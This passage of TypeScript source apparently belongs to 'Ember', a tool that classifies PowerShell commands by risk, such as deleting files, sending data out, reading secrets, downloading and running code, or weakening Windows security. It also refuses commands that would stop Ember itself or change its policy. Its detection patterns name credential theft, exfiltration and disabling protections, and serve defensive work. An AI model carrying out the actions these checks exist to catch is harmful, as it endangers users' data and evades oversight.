  let text: string | null | undefined;
  let file: Arg | undefined;
  let interactiveShell = true;
  for (let k = 0; k < a.length; k++) {
    const v = (a[k].v ?? "").toLowerCase();
    if (a[k].v === null) { text = null; break; }
    // `powershell -` (or `-Command -`) reads its commands from stdin.
    if (v === "-" || (/^[-/](c|co|com|comm|comma|comman|command)$/.test(v) && a[k + 1]?.v === "-" && a.length === k + 2)) { intoInterpreter(h); return; }
    if (/^[-/](e|ec|en|enc|enco|encod|encode|encoded|encodedc|encodedco|encodedcom|encodedcomm|encodedcomma|encodedcomman|encodedcommand)$/.test(v)) { h.e.unclear("unclear.encoded-command", "It runs an encoded command Ember can't read."); return; }
    if (/^[-/](c|co|com|comm|comma|comman|command)$/.test(v)) {
      const rest = a.slice(k + 1);
      if (rest.some(x => x.v === null)) { text = null; break; }
      text = rest.map(x => x.v).join(" ");
      interactiveShell = false;
      break;
    }
    if (/^[-/](f|fi|fil|file)$/.test(v)) { file = a[k + 1]; interactiveShell = false; break; }
    if (/^[-/](noexit)$/.test(v)) { h.e.unclear("unclear.interactive", SAYS.interactive); continue; }
    if (/^[-/](executionpolicy|ep|ex|exec|version|v|inputformat|outputformat|of|if|windowstyle|w|configurationname|psconsolefile|workingdirectory|wd|settingsfile|custompipename)$/.test(v)) { k++; continue; }
    if (/^[-/](nologo|noprofile|nop|noninteractive|noni|sta|mta|nol|login|l|mta|interactive|i)$/.test(v)) continue;
    if (!v.startsWith("-") && !v.startsWith("/")) { text = a.slice(k).map(x => x.v).join(" "); interactiveShell = false; break; }
    h.e.unclear("unclear.powershell-option", "Ember can't tell what PowerShell would run.");
    return;
  }
  if (file) {
    // Through WSL interop the script's path is Windows's: one on another computer's share (`\\host\share\x.ps1`,
    // `//host/share/x.ps1`) runs from there, as on Windows (review #171).
    const ws = h.pn.interop ? windowsScope(h, "powershell") : null;
    if (ws && file.v !== null) h.e.usePath(file, "exec", child(h.sc, ws));
    runScript(h, file, "powershell");
    return;
  }
  if (text === null) { h.e.unclear("unclear.shell-text", "It runs PowerShell text Ember can't see."); return; }
  if (text === undefined || interactiveShell) {
    if (h.s.stdin === "pipe" || h.s.stdin === "heredoc") { intoInterpreter(h); return; }
    h.e.unclear("unclear.interactive", SAYS.interactive);
    return;
  }
  if (SENDKEYS.test(text)) { h.e.refuseWith("ember.input", "input"); return; }
  const sc = windowsScope(h, "powershell");
  if (!sc) return;
  h.e.nested(text, "powershell", h.sc, "powershell -Command", sc);
});

// ------------------------------------------------------------------------------------------------------------------
// PowerShell cmdlets (§3.4.2, §3.5's PowerShell rows).

/** A cmdlet's parameters bound by name (prefixes and aliases), position, and the unknown ones. */
interface PsBound { named: Map<string, Arg[]>; switches: Set<string>; unknown: string[]; blocks: string[] }
function bindPs(h: H, spec: PsCmdletSpec | undefined): PsBound {
  const out: PsBound = { named: new Map(), switches: new Set(), unknown: [], blocks: [] };
  const cmd = h.s.ps;
  if (!cmd || !spec) return out;
  const params: Record<string, PsParamKind> = { ...PS_COMMON, ...spec.params };
  const aliases: Record<string, string> = { ...PS_COMMON_ALIASES, ...(spec.aliases ?? {}) };
  const names = Object.keys(params);
  const resolve = (written: string): string | null => {
    const l = written.toLowerCase();
    const exact = names.find(n => n.toLowerCase() === l) ?? aliases[l];
    if (exact) return exact;
    const pre = names.filter(n => n.toLowerCase().startsWith(l));
    return pre.length === 1 ? pre[0] : null;
  };
  const push = (name: string, vals: Arg[]): void => { out.named.set(name, [...(out.named.get(name) ?? []), ...vals]); };
  let pos = 0;
  let positionalOnly = false;
  const args = cmd.args;
  for (let k = 0; k < args.length; k++) {
    const a = args[k];
    if (a.kind === "block") { out.blocks.push(a.segs.map(s => (s.t === "lit" ? s.s : "")).join("")); continue; }
    if (a.kind === "param" && !positionalOnly) {
      if (a.param === "") { positionalOnly = true; continue; }
      const name = resolve(a.param ?? "");
      if (!name) { out.unknown.push(a.param ?? ""); continue; }
      if (params[name] === "s") {
        const v = a.attached ? h.e.psArgValues(a, h.sc)[0]?.v : "True";
        if (v === null || !/^(false|\$false|0)$/i.test(v ?? "")) out.switches.add(name);
        continue;
      }
      if (a.attached) { push(name, h.e.psArgValues(a, h.sc)); continue; }
      const next = args[k + 1];
      if (next && next.kind !== "param") { push(name, next.kind === "block" ? [{ v: null, raw: next.raw, glob: false }] : h.e.psArgValues(next, h.sc)); k++; }
      else push(name, [{ v: null, raw: "", glob: false }]);
      continue;
    }
    const vals = a.kind === "param" ? [{ v: `-${a.param}`, raw: a.raw, glob: false }] : h.e.psArgValues(a, h.sc);
    const name = spec.pos[pos++];
    if (!name) { out.unknown.push("(extra argument)"); continue; }
    push(name, vals);
  }
  return out;
}
/** The cmdlet's path arguments: -Path (wildcards) and -LiteralPath (none). */
function psPaths(b: PsBound, ...names: string[]): Arg[] {
  const out: Arg[] = [];
  for (const n of names) for (const v of b.named.get(n) ?? []) out.push(n === "LiteralPath" ? { ...v, glob: false } : v);
  return out;
}
const REGISTRY = /^(hklm|hkcu|hkcr|hku|hkcc|registry|hkey_[a-z_]+)(:|::)/i;
/** A cmdlet's registry, environment, certificate or function targets, judged; returns the file-system ones. */
function psTargets(h: H, paths: Arg[], write: boolean): Arg[] {
  const files: Arg[] = [];
  for (const p of paths) {
    const v = p.v;
    if (v === null) { files.push(p); continue; }
    if (POLICY_KEY.test(v)) { h.e.refuseWith("ember.policy", write ? "safety" : "read"); continue; }
    if (write && /^(remove-item|move-item|rename-item|clear-item)$/.test(h.key) && policyAncestor(v)) { h.e.refuseWith("ember.policy", "safety"); continue; }
    if (REGISTRY.test(v)) { if (write) h.e.add("system", "system.registry", "Changes the Windows registry."); continue; }
    if (/^env:/i.test(v)) { if (!write && (/^env:\\?\*?$/i.test(v) || SECRET_VAR.test(v.slice(4)))) h.e.add("secret", "secret.env", SAYS.env); continue; }
    if (/^cert:/i.test(v)) { if (write) h.e.add("secret", "secret.program", SAYS.secrets); continue; }
    if (/^function:/i.test(v)) { if (write) h.e.unclear("unclear.alias", "It changes a function Ember can't follow."); continue; }
    if (/^(variable|alias|wsman):/i.test(v)) continue;
    files.push(p);
  }
  return files;
}
function psUnknown(h: H, b: PsBound): void {
  if (b.unknown.length) h.e.unclear("unclear.ps-parameter", `Ember can't tell what ${h.prog}'s ${b.unknown[0] || "arguments"} mean.`);
}
const piped = (h: H): Obj[] => (h.s.stdin === "pipe" ? [{ kind: "other", text: "what the pipeline gives it", abs: null }] : []);
/** The paths a listing earlier in the pipeline hands this command (`Get-ChildItem ~\.ssh | Get-Content`), if any. */
const pipedListing = (h: H): Arg[] => (h.s.stdin === "pipe" && h.s.pipedFrom !== undefined ? h.e.listed.get(h.s.pipedFrom) ?? [] : []);

reg(CMDLETS, ["remove-item"], h => {
  const b = bindPs(h, PS_CMDLETS["remove-item"]);
  psUnknown(h, b);
  const rec = b.switches.has("Recurse");
  const files = psTargets(h, psPaths(b, "Path", "LiteralPath"), true);
  const fromPipe = files.length === 0 && psPaths(b, "Path", "LiteralPath").length === 0;
  // Items a listing hands down: what is in the folders it lists goes (judged as a tree, so nothing of Ember's is in it).
  if (fromPipe) objsOf(h, pipedListing(h), "deleteTree");
  const objs = [...objsOf(h, files, rec ? "deleteTree" : "delete"), ...(fromPipe ? piped(h) : [])];
  if (objs.length === 0 && files.length === 0 && psPaths(b, "Path", "LiteralPath").length) return;
  const widening = [...(rec ? ["recursive"] : []), ...["Include", "Exclude", "Filter"].filter(n => b.named.has(n)).map(n => `-${n}`)];
  const list = listOf(objs);
  h.e.add("destroy", "ps.Remove-Item", rec ? `Deletes ${list} and everything in ${objs.length > 1 ? "them" : "it"}.` : `Deletes ${list}.`, { objects: objs, widening, program: "Remove-Item" });
});
reg(CMDLETS, ["clear-content", "clear-item", "clear-itemproperty", "clear-recyclebin", "clear-disk"], h => {
  if (h.key === "clear-recyclebin") { h.e.add("destroy", "trash.empty", "Empties the trash."); return; }
  if (h.key === "clear-disk") { h.e.add("destroy", "disk.erase", "Erases or repartitions a disk."); return; }
  const b = bindPs(h, PS_CMDLETS[h.key] ?? PS_CMDLETS["clear-item"]);
  psUnknown(h, b);
  const files = psTargets(h, psPaths(b, "Path", "LiteralPath"), true);
  if (files.length || h.key === "clear-content") {
    const objs = [...objsOf(h, files, "write"), ...piped(h)];
    h.e.add("destroy", h.key === "clear-content" ? "ps.Clear-Content" : "ps.Clear-Item", `Empties ${listOf(objs)}.`, { objects: objs });
  }
});
function psCopyMove(h: H, kind: "copy" | "move" | "rename"): void {
  const spec = PS_CMDLETS[kind === "copy" ? "copy-item" : kind === "move" ? "move-item" : "rename-item"];
  const b = bindPs(h, spec);
  psUnknown(h, b);
  if (b.named.has("ToSession")) h.e.add("publish", "upload.session", "Sends data to another computer.");
  const srcs = psTargets(h, psPaths(b, "Path", "LiteralPath"), kind !== "copy");
  objsOf(h, srcs, kind === "copy" ? (b.switches.has("Recurse") ? "readTree" : "read") : "move");
  // Items a pipeline hands down (`Get-Item x.exe | Copy-Item -Destination y.exe`): the ones a listing names, else ones
  // Ember can't name (commands-remote-v4-5).
  const fromPipe = srcs.length === 0 && psPaths(b, "Path", "LiteralPath").length === 0 && h.s.stdin === "pipe";
  const listedSrcs = fromPipe ? pipedListing(h) : [];
  const pipedSrcs: Arg[] = fromPipe ? (listedSrcs.length ? listedSrcs : [{ v: null, raw: "(input)", glob: false }]) : [];
  if (listedSrcs.length) objsOf(h, listedSrcs, kind === "copy" ? "readTree" : "move");
  let dest: Arg | undefined;
  if (kind === "rename") {
    const nn = (b.named.get("NewName") ?? [])[0];
    const src = srcs[0];
    if (nn && src && nn.v !== null && src.v !== null) {
      const mod = h.sc.path.flavour === "win32" ? win32 : posix;
      dest = /[\\/]/.test(nn.v) ? nn : lit(mod.join(mod.dirname(src.v), nn.v));
    } else dest = nn ? { v: null, raw: nn.raw, glob: false } : undefined;
  } else dest = (b.named.get("Destination") ?? [])[0] ?? (kind === "copy" || kind === "move" ? lit(".") : undefined);
  if (!dest || b.named.has("ToSession")) return;
  const rule = kind === "copy" ? "ps.Copy-Item" : kind === "move" ? "ps.Move-Item" : "ps.Rename-Item";
  if (dest.v !== null && REGISTRY.test(dest.v)) { h.e.add("system", "system.registry", "Changes the Windows registry."); return; }
  const destObj = h.e.usePath(dest, "write", h.sc);
  h.e.carryCopies(srcs, destObj, h.sc, kind === "rename");
  if (kind !== "rename") {
    h.e.carryCopies(pipedSrcs, destObj, h.sc);
    // A listed folder's files land in the destination itself.
    if (destObj.abs !== null && listedSrcs.some(s => h.e.holdsDownload(s, h.sc))) h.e.carryDownload(destObj.abs, h.sc);
  } else {
    // A piped item renamed in its own folder (or a listed folder's item in that folder): either name may be the download.
    const nn = (b.named.get("NewName") ?? [])[0]?.v;
    const mod = h.sc.path.flavour === "win32" ? win32 : posix;
    if (nn) {
      for (const s of pipedSrcs) {
        if (!h.e.isDownloaded(s, h.sc) && !h.e.holdsDownload(s, h.sc) && !h.e.mayBeDownload(s)) continue;
        const names = /[\\/]/.test(nn) ? [nn] : s.v === null ? [nn] : [mod.join(mod.dirname(s.v), nn), mod.join(s.v, nn)];
        for (const n of names) h.e.download(n, h.sc);
      }
    }
  }
  if (destObj.abs === null) { h.e.add("destroy", rule, "Writes to a file Ember can't name.", { objects: [destObj] }); return; }
  if (b.switches.has("Force")) h.e.add("destroy", rule, `Replaces ${destObj.text} if it exists.`, { objects: [destObj], widening: ["-Force"] });
  else h.e.add("destroy", rule, `Replaces ${destObj.text} if it exists.`, { objects: [destObj], ifExists: destObj.abs });
}
reg(CMDLETS, ["copy-item"], h => psCopyMove(h, "copy"));
reg(CMDLETS, ["move-item"], h => psCopyMove(h, "move"));
reg(CMDLETS, ["rename-item"], h => psCopyMove(h, "rename"));
function psWrite(h: H, kind: "set" | "add" | "out" | "tee" | "export"): void {
  const spec = PS_CMDLETS[kind === "set" ? "set-content" : kind === "add" ? "add-content" : kind === "out" ? "out-file" : kind === "tee" ? "tee-object" : h.key];
  const b = bindPs(h, spec);
  psUnknown(h, b);
  const files = psTargets(h, psPaths(b, "Path", "FilePath", "LiteralPath"), true);
  const append = kind === "add" || b.switches.has("Append");
  const rule = kind === "set" ? "ps.Set-Content" : kind === "out" ? "ps.Out-File" : "redirect.overwrite";
  for (const f of files) {
    if (f.v !== null && NULL_SINKS.has(f.v.toLowerCase())) continue;
    if (append) { h.e.append(f, h.sc, "redirect.append"); continue; }
    const obj = h.e.usePath(f, "write", h.sc);
    if (b.switches.has("NoClobber")) continue;
    if (obj.abs === null) { h.e.add("destroy", rule, "Writes to a file Ember can't name.", { objects: [obj] }); continue; }
    h.e.add("destroy", rule, `Overwrites ${obj.text} if it exists.`, { objects: [obj], ifExists: obj.abs });
  }
  if (kind === "tee" && b.named.has("Variable") && files.length === 0) return;
}
reg(CMDLETS, ["set-content"], h => psWrite(h, "set"));
reg(CMDLETS, ["add-content"], h => psWrite(h, "add"));
reg(CMDLETS, ["out-file"], h => psWrite(h, "out"));
reg(CMDLETS, ["tee-object"], h => psWrite(h, "tee"));
// Export-Csv and Export-Clixml write their file like Out-File (-Append adds to it, -NoClobber keeps one that exists).
reg(CMDLETS, ["export-csv", "export-clixml"], h => psWrite(h, "export"));
reg(CMDLETS, ["new-item"], h => {
  const b = bindPs(h, PS_CMDLETS["new-item"]);
  psUnknown(h, b);
  const names = b.named.get("Name") ?? [];
  let paths = psPaths(b, "Path");
  if (names.length) {
    const mod = h.sc.path.flavour === "win32" ? win32 : posix;
    paths = (paths.length ? paths : [lit(".")]).flatMap(p => names.map(n => (p.v === null || n.v === null ? { v: null, raw: n.raw, glob: false } : lit(mod.join(p.v, n.v)))));
  }
  const type = ((b.named.get("ItemType") ?? [])[0]?.v ?? "").toLowerCase();
  const files = psTargets(h, paths, true);
  const objs = objsOf(h, files, "write");
  if (/symboliclink|junction|hardlink/.test(type)) {
    const targets = b.named.get("Value") ?? [];
    for (const t of targets) h.e.usePath(t, "read", h.sc);
    // A link to a download runs the download (commands-remote-c2-2).
    for (const o of objs) h.e.carryCopies(targets, o, h.sc, true);
  }
  if (b.switches.has("Force") && type !== "directory") for (const o of objs) if (o.abs) h.e.add("destroy", "ps.New-Item", `Replaces ${o.text} if it exists.`, { objects: [o], ifExists: o.abs });
});
reg(CMDLETS, ["get-content", "get-item", "select-string", "get-itemproperty", "get-filehash", "import-csv", "import-clixml", "get-acl", "test-path", "import-powershelldatafile", "format-hex", "get-itempropertyvalue"], h => {
  const b = bindPs(h, PS_CMDLETS[h.key] ?? { params: { Path: "v", LiteralPath: "v" }, aliases: { pspath: "LiteralPath", lp: "LiteralPath" }, pos: ["Path"] });
  const paths = psPaths(b, "Path", "LiteralPath");
  const files = psTargets(h, paths, false);
  objsOf(h, files, "read");
  if (files.some(f => f.v === null)) h.e.unclear("unclear.unresolved-arg", `Ember can't tell what ${h.prog} reads.`);
  // Reading what a listing hands down reads the files in the folders it lists.
  if (paths.length === 0) objsOf(h, pipedListing(h), h.key === "get-item" ? "list" : "readTree");
  if (h.key === "get-item") h.e.listed.set(h.e.at, files);
});
// Resolve-Path and Convert-Path look a path up: one on another computer's share connects and signs in there, as
// listing it does (review #171). Otherwise they only print names, as before.
reg(CMDLETS, ["resolve-path", "convert-path"], h => {
  textProgram(h);
  const b = bindPs(h, { params: { Path: "v", LiteralPath: "v", Relative: "s", RelativeBasePath: "v", Credential: "v" }, aliases: { pspath: "LiteralPath", lp: "LiteralPath" }, pos: ["Path"] });
  for (const a of psPaths(b, "Path", "LiteralPath")) if (/^[\\/]{2}/.test(a.v ?? "")) h.e.usePath(a, "list", h.sc);
});
reg(CMDLETS, ["get-childitem"], h => {
  const b = bindPs(h, PS_CMDLETS["get-childitem"]);
  const paths = psPaths(b, "Path", "LiteralPath");
  const files = psTargets(h, paths, false);
  objsOf(h, files, "list");
  h.e.listed.set(h.e.at, paths.length === 0 ? [lit(".")] : files);
  // A search for secret files by name prints where they are, as find -name does (§3.4.5).
  const patterns = [...(b.named.get("Filter") ?? []), ...(b.named.get("Include") ?? [])].map(a => a.v).filter((v): v is string => v !== null);
  if (patterns.some(pt => secretPattern(pt, h.sc))) h.e.add("secret", "path.secret", `Reads or changes passwords, keys or other secrets (${patterns.join(", ")}).`);
});
reg(CMDLETS, ["set-location", "push-location", "pop-location"], h => NATIVE.cd(h));
reg(CMDLETS, ["invoke-webrequest", "invoke-restmethod"], h => {
  const b = bindPs(h, PS_CMDLETS[h.key]);
  psUnknown(h, b);
  const uri = (b.named.get("Uri") ?? [])[0]?.v ?? "";
  const host = hostOf(uri) || "another computer";
  if (/^file:/i.test(uri)) h.e.usePath(lit(decodeURIComponent(uri.replace(/^file:\/\/\/?/i, ""))), "read", h.sc);
  const method = ((b.named.get("Method") ?? [])[0]?.v ?? "").toUpperCase();
  for (const f of b.named.get("InFile") ?? []) h.e.usePath(f, "read", h.sc);
  if (/^(POST|PUT|PATCH|DELETE|MERGE)$/.test(method) || b.named.has("Body") || b.named.has("InFile")) h.e.add("publish", "send.http", `Sends data to ${host}.`, { objects: [{ kind: "host", text: host, abs: null }] });
  for (const o of b.named.get("OutFile") ?? []) {
    // A name Ember can't see all of (`-OutFile $f`, `-OutFile (Join-Path …)`): the names the text gives it, else
    // unnamed (commands-remote-r5-1).
    if (o.v === null) { h.e.downloadTo(o, h.sc); continue; }
    const obj = h.e.usePath(o, "write", h.sc);
    if (obj.abs) h.e.add("destroy", "download.output", `Overwrites ${obj.text} if it exists.`, { objects: [obj], ifExists: obj.abs });
    h.e.download(o.v, h.sc);
  }
});
reg(CMDLETS, ["invoke-expression"], h => {
  if (h.args.some(a => a.fetch) || (h.s.stdin === "pipe" && h.s.fetchBefore)) { h.e.add("escape", "escape.download-run", SAYS.downloadsAndRuns); return; }
  for (const a of h.args) if (a.v && SENDKEYS.test(a.v)) h.e.refuseWith("ember.input", "input");
  for (const a of h.args) if (a.v) emberText(h, a.v);
  h.e.unclear("unclear.eval", "Runs code Ember can't see.");
});
reg(CMDLETS, ["invoke-command", "enter-pssession", "new-pssession", "invoke-wmimethod", "remove-wmiobject", "set-wmiinstance", "invoke-cimmethod", "remove-ciminstance", "set-ciminstance", "new-ciminstance", "add-type", "new-object", "import-module", "set-alias", "new-alias", "invoke-history", "read-host", "out-gridview", "start-transcript", "register-objectevent", "register-wmievent", "register-engineevent", "new-webserviceproxy", "invoke-restmethod-legacy", "start-dscconfiguration", "invoke-dscresource"], h => {
  const text = h.args.map(a => a.v ?? a.raw).join(" ");
  if (SENDKEYS.test(text)) { h.e.refuseWith("ember.input", "input"); return; }
  if (/^(invoke-command|enter-pssession|new-pssession)$/.test(h.key) && h.args.some(a => /^(computername|cn|session|hostname|connectionuri|vmname|vmid|containerid)$/i.test(a.param ?? ""))) h.e.add("publish", "send.remote-session", "Runs commands on another computer.");
  if (h.key === "read-host") { h.e.unclear("unclear.interactive", SAYS.interactive); return; }
  if (h.key === "out-gridview") { h.e.unclear("unclear.gui", SAYS.openApp); return; }
  if (h.key === "enter-pssession") { h.e.unclear("unclear.interactive", SAYS.interactive); return; }
  if (h.key === "start-transcript") { for (const a of h.args) if (a.param === undefined && a.v) h.e.usePath(a, "write", h.sc); return; }
  h.e.unclear(`unclear.${h.key}`, h.key === "import-module" ? "Runs code Ember can't see." : h.key.endsWith("-alias") ? "It defines an alias Ember can't follow." : SAYS.unclear);
});
reg(CMDLETS, ["start-process"], h => {
  const b = bindPs(h, PS_CMDLETS["start-process"]);
  psUnknown(h, b);
  const file = (b.named.get("FilePath") ?? [])[0];
  const argList = b.named.get("ArgumentList") ?? [];
  const verb = ((b.named.get("Verb") ?? [])[0]?.v ?? "").toLowerCase();
  if (verb === "runas" || verb === "runasuser") h.e.add("system", "system.sudo", SAYS.root);
  else if (verb && verb !== "open") h.e.unclear("unclear.start-verb", "Ember can't tell what this opens.");
  if (b.named.has("Credential")) h.e.add("system", "system.sudo", "Runs as another user.");
  if (!file || file.v === null) { h.e.unclear("unclear.program", "It runs a program Ember can't name."); return; }
  if (/^ember:/i.test(file.v)) { h.e.refuseWith("ember.url", "input"); return; }
  const wait = b.switches.has("Wait");
  const program = /\.(exe|com|bat|cmd|ps1)$/i.test(file.v) || !/[.\\/:]/.test(file.v);
  if (!wait) h.e.add("escape", program ? "escape.background" : "escape.launcher", program ? SAYS.keepsRunning : SAYS.opensProgram);
  for (const f of b.named.get("RedirectStandardOutput") ?? []) h.e.usePath(f, "write", h.sc);
  for (const f of b.named.get("RedirectStandardError") ?? []) h.e.usePath(f, "write", h.sc);
  for (const f of b.named.get("RedirectStandardInput") ?? []) h.e.usePath(f, "read", h.sc);
  if (h.e.isDownloaded(file, h.sc)) h.e.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
  if (!program) { h.e.usePath(file, "read", h.sc); return; }
  if (argList.some(a => a.v === null || /\s/.test(a.v))) { h.e.unclear("unclear.start-args", "Ember can't tell exactly which arguments it passes."); return; }
  h.e.payload([file, ...argList], h.sc, "Start-Process");
});
reg(CMDLETS, ["start-job", "start-threadjob", "register-scheduledjob", "start-scheduledtask"], h => {
  h.e.add("escape", "escape.background", SAYS.keepsRunning);
  if (h.key !== "start-scheduledtask") h.e.unclear("unclear.script-block", "It runs a script block Ember can't follow.");
  else h.e.add("system", "system.schedule", "Schedules something to run later or at login.");
});
reg(CMDLETS, ["stop-process", "stop-service-process", "debug-process"], h => {
  const b = bindPs(h, PS_CMDLETS["stop-process"]);
  const ids = (b.named.get("Id") ?? []).map(a => a.v);
  const names = (b.named.get("Name") ?? []).map(a => a.v);
  for (const n of names) {
    if (n === null) continue;
    if (emberNamed(h, n) || (/[*?[]/.test(n) && globRegExp(n, { ...h.sc.path, flavour: "win32" }, false).test("ember"))) { h.e.refuseWith("ember.process", "safety"); return; }
  }
  // `Get-Process <names> | Stop-Process`: the names Get-Process was given are what stops (all of them: Ember too).
  const from = h.s.stdin === "pipe" && h.s.pipedFrom !== undefined ? h.e.commands[h.s.pipedFrom] : undefined;
  if (ids.length + names.length === 0 && from && from.program.toLowerCase() === "get-process") {
    const given: (string | null)[] = [];
    const pidsGiven: (string | null)[] = [];
    for (let k = 0; k < from.args.length; k++) {
      const v = from.args[k];
      if (v !== null && /^-(id|pid)$/i.test(v)) { pidsGiven.push(from.args[k + 1] ?? null); k++; continue; }
      if (v !== null && /^-(name|processname)$/i.test(v)) { given.push(from.args[k + 1] ?? null); k++; continue; }
      if (v !== null && v.startsWith("-")) continue;
      given.push(v);
    }
    if (given.length + pidsGiven.length === 0) { h.e.refuseWith("ember.process", "safety"); return; }
    for (const n of given) {
      if (n === null) continue;
      if (emberNamed(h, n) || (/[*?[]/.test(n) && globRegExp(n, { ...h.sc.path, flavour: "win32" }, false).test("ember"))) { h.e.refuseWith("ember.process", "safety"); return; }
    }
    killPids(h, [...pidsGiven, ...given]);
    return;
  }
  killPids(h, [...ids, ...names, ...(ids.length + names.length === 0 ? ["(from the pipeline)"] : [])]);
});
reg(CMDLETS, ["set-itemproperty", "new-itemproperty", "remove-itemproperty", "rename-itemproperty", "set-item", "copy-itemproperty", "move-itemproperty", "clear-itemproperty"], h => {
  const b = bindPs(h, PS_CMDLETS[h.key] ?? PS_CMDLETS["set-itemproperty"]);
  const paths = psPaths(b, "Path", "LiteralPath");
  const files = psTargets(h, paths, true);
  objsOf(h, files, "write");
  if (paths.length === 0 && h.s.stdin === "pipe") h.e.unclear("unclear.unresolved-arg", `Ember can't tell what ${h.prog} changes.`);
});
reg(CMDLETS, ["expand-archive"], h => {
  const b = bindPs(h, PS_CMDLETS["expand-archive"]);
  psUnknown(h, b);
  const arch = psPaths(b, "Path", "LiteralPath");
  objsOf(h, arch, "read");
  const dest = (b.named.get("DestinationPath") ?? [])[0] ?? lit(".");
  const into = h.e.usePath(dest, "write", h.sc);
  if (b.switches.has("Force") || into.abs === null || !inWorkTree(into.abs, h.sc.path)) {
    h.e.add("destroy", "archive.unpack", `Unpacks ${arch[0]?.v ?? "an archive"} over files in ${into.text === "." ? "this folder" : into.text}.`, { objects: [into] });
  }
  if (arch.some(a => h.e.isDownloaded(a, h.sc)) && into.abs) h.e.downloads.push(into.abs);
});
reg(CMDLETS, ["compress-archive"], h => {
  const b = bindPs(h, PS_CMDLETS["compress-archive"]);
  psUnknown(h, b);
  objsOf(h, psPaths(b, "Path", "LiteralPath"), "readTree");
  for (const d of b.named.get("DestinationPath") ?? []) {
    const obj = h.e.usePath(d, "write", h.sc);
    if ((b.switches.has("Force") || b.switches.has("Update")) && obj.abs) h.e.add("destroy", "redirect.overwrite", `Overwrites ${obj.text} if it exists.`, { objects: [obj], ifExists: obj.abs });
  }
});
reg(CMDLETS, ["invoke-item"], h => {
  const b = bindPs(h, PS_CMDLETS["invoke-item"]);
  const files = psPaths(b, "Path", "LiteralPath");
  for (const f of files) {
    if (/^ember:/i.test(f.v ?? "")) { h.e.refuseWith("ember.url", "input"); return; }
    if (h.e.isDownloaded(f, h.sc)) h.e.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
  }
  objsOf(h, files, "read");
  h.e.add("escape", "escape.launcher", SAYS.opensProgram);
});
reg(CMDLETS, ["start-bitstransfer"], h => {
  const b = bindPs(h, PS_CMDLETS["start-bitstransfer"]);
  const type = ((b.named.get("TransferType") ?? [])[0]?.v ?? "download").toLowerCase();
  if (b.switches.has("Asynchronous")) h.e.add("escape", "escape.background", SAYS.keepsRunning);
  if (type === "upload" || type === "uploadreply") { objsOf(h, b.named.get("Source") ?? [], "read"); h.e.add("publish", "send.http", "Sends data to another computer."); return; }
  const dests = b.named.get("Destination") ?? [];
  for (const d of dests) {
    if (d.v === null) { h.e.downloadTo(d, h.sc); continue; }
    h.e.usePath(d, "write", h.sc);
    h.e.download(d.v, h.sc);
  }
  // With no destination it saves into the current folder under the address's name (commands-remote-c5-2).
  if (dests.length === 0) {
    for (const src of b.named.get("Source") ?? []) {
      const name = src.v?.replace(/[?#].*$/, "").split("/").pop();
      if (!name) { h.e.downloadUnnamed(".", h.sc); continue; }
      h.e.usePath(lit(name), "write", h.sc);
      h.e.download(name, h.sc);
    }
  }
});
reg(CMDLETS, ["write-output", "write-host", "write-information", "write-verbose", "write-warning", "write-error", "write-debug"], h => {
  // What Write-Output hands down the pipeline names items, as a listing's (`Write-Output $d | Remove-Item`).
  if (h.key === "write-output") h.e.listed.set(h.e.at, h.args.filter(a => a.param === undefined));
  for (const a of h.args) {
    if (a.v === null && /\$\{?env:[A-Za-z0-9_]*(TOKEN|SECRET|PASSWORD|PASSWD|PASS|KEY|CREDENTIAL|AUTH|SESSION|COOKIE|PRIVATE)/i.test(a.raw)) h.e.add("secret", "secret.env", SAYS.env);
  }
});
reg(CMDLETS, ["where-object", "foreach-object", "sort-object", "select-object", "group-object", "measure-object"], h => {
  const cmd = h.s.ps;
  if (!cmd) return;
  for (const a of cmd.args) {
    if (a.kind === "block") {
      const text = a.segs.map(s => (s.t === "lit" ? s.s : "")).join("");
      if (!restrictedExpression(text)) h.e.unclear("unclear.script-block", "It runs a script block Ember can't follow.");
      if (SENDKEYS.test(text)) h.e.refuseWith("ember.input", "input");
      continue;
    }
    if (h.key === "foreach-object" && a.kind === "word") h.e.unclear("unclear.script-block", "It calls a method Ember can't follow.");
    if (a.kind === "param" && /^(begin|end|process|remainingscripts|membername|argumentlist)$/i.test(a.param ?? "") && h.key === "foreach-object") h.e.unclear("unclear.script-block", "It runs a script block Ember can't follow.");
  }
});
reg(CMDLETS, ["get-clipboard"], h => { h.e.add("secret", "secret.clipboard", SAYS.clipboard); });
reg(CMDLETS, ["get-credential", "get-storedcredential", "export-pfxcertificate", "convertfrom-securestring", "export-certificate", "import-pfxcertificate", "get-bitlockervolume", "backup-bitlockerkeyprotector", "get-wificredential"], h => { h.e.add("secret", "secret.program", SAYS.secrets); });
reg(CMDLETS, ["new-service", "set-service", "start-service", "stop-service", "restart-service", "suspend-service", "resume-service", "remove-service"], h => {
  const names = h.args.filter(a => a.param === undefined).map(a => ({ kind: "other" as const, text: a.v ?? a.raw, abs: null }));
  h.e.add("system", "service.change", "Starts, stops or changes a system service.", { objects: names });
});
reg(CMDLETS, ["new-localuser", "remove-localuser", "set-localuser", "add-localgroupmember", "remove-localgroupmember", "new-localgroup", "remove-localgroup", "enable-localuser", "disable-localuser", "rename-localuser", "add-adgroupmember", "new-aduser", "set-adaccountpassword"], h => { h.e.add("system", "system.users", "Changes users or groups."); });
reg(CMDLETS, ["set-acl"], h => { h.e.add("system", "system.permissions", "Changes who may read or change files."); objsOf(h, h.args.filter(a => a.param === undefined && a.v !== null && !a.raw.startsWith("$")), "write"); });
reg(CMDLETS, ["set-mppreference", "add-mppreference", "remove-mppreference", "unblock-file", "set-executionpolicy", "disable-windowsoptionalfeature", "set-processmitigation", "disable-computerrestore"], h => {
  if (h.key === "add-mppreference" && !h.args.some(a => /^exclusion/i.test(a.param ?? ""))) return;
  h.e.add("system", "system.security", "Turns off or weakens a security protection.");
});
reg(CMDLETS, ["restart-computer", "stop-computer", "suspend-bitlocker"], h => { h.e.add("system", "system.power", "Shuts down, restarts or logs out."); });
reg(CMDLETS, ["install-package", "uninstall-package", "install-module", "uninstall-module", "update-module", "add-windowscapability", "remove-windowscapability", "enable-windowsoptionalfeature", "install-script", "update-script", "install-psresource", "update-psresource", "uninstall-psresource", "add-appxpackage", "remove-appxpackage", "install-windowsfeature", "uninstall-windowsfeature", "register-packagesource", "set-psrepository", "register-psrepository"], h => {
  h.e.add("system", "pkg.system", "Installs, removes or upgrades software.", { objects: h.args.filter(a => a.param === undefined).map(a => ({ kind: "package" as const, text: a.v ?? a.raw, abs: null })) });
});
